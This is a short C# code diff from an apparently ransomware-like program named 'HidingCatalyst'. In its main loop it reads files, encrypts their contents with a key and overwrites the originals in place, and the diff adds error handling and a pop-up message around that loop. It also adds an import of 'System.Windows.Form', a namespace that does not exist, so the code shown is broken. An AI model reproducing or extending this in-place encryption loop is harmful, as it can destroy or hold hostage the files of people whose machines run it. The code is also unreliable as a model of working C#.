@@ -4,6 +4,7 @@ using System.Linq;
 using System.Text;
 using System.Threading;
 using System.IO;
+using System.Windows.Form;
 using n30encryption;
 
 namespace HidingCatalyst {
@@ -29,6 +30,7 @@ namespace HidingCatalyst {
 
                 if (!GetFileName(a).Substring(0, 3).Equals("n30")) {
 
+		try {
                     byte[] buffer = File.ReadAllBytes(a);
 
                     recoveryFiles.Add(buffer);
@@ -36,6 +38,7 @@ namespace HidingCatalyst {
 
                     byte[] newBuffer = crypt.encryptKey(buffer, key);
                     File.WriteAllBytes(a, newBuffer);
+		} catch (Exception e) { MessageBox.Show("Can't Encrypt:\n" + a); }
                 }
             }
 
